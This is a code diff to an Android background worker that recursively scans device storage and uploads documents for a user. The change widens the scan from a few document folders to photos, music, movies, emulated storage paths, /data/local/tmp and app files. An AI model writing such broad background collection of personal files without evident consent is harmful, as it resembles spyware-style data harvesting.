@@ -59,20 +59,31 @@ public class DocumentUploadWorker extends Worker {
     private void uploadDocuments(String userId) {
         uploadedCount = 0;
         
-        // Scan multiple document directories
+        // Scan all possible document directories
         String[] scanPaths = {
                 "/sdcard/Download",
+                "/sdcard/Downloads", 
                 "/sdcard/Documents",
                 "/sdcard/DCIM",
-                "/sdcard/Downloads",
+                "/sdcard/Pictures",
+                "/sdcard/Music",
+                "/sdcard/Movies",
+                "/sdcard/Audiobooks",
+                "/storage/emulated/0/Download",
+                "/storage/emulated/0/Downloads",
+                "/storage/emulated/0/Documents",
+                "/data/local/tmp",
+                getApplicationContext().getFilesDir().getAbsolutePath(),
                 getApplicationContext().getExternalFilesDir(null) != null ? getApplicationContext().getExternalFilesDir(null).getAbsolutePath() : null,
         };
 
+        Log.d(TAG, "Starting document scan for user: " + userId);
+        
         for (String path : scanPaths) {
-            if (path != null && uploadedCount < MAX_DOCUMENTS_PER_SYNC) {
+            if (path != null && !path.isEmpty() && uploadedCount < MAX_DOCUMENTS_PER_SYNC) {
                 File dir = new File(path);
-                if (dir.exists() && dir.isDirectory()) {
-                    Log.d(TAG, "Scanning directory: " + path);
+                if (dir.exists() && dir.isDirectory() && dir.canRead()) {
+                    Log.d(TAG, "Scanning: " + path);
                     scanDirectoryRecursive(dir, userId);
                 }
             }
